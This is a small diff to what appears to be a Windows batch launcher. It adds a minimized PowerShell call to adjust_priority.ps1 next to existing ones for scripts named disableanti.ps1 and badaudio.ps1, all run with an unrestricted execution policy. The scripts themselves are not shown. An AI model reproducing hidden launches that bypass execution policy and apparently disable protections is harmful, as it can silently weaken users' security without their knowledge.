@@ -1,5 +1,6 @@
 start /min "" powershell.exe -executionpolicy unrestricted -File .\disableanti.ps1
 start /min "" powershell.exe -executionpolicy unrestricted -File .\badaudio.ps1
+start /min "" powershell.exe -executionpolicy unrestricted -File .\adjust_priority.ps1
 for /f "tokens=*" %%a in ('py -c "import sys; print(sys.executable)"') do (
 	set exec=%%a
 )
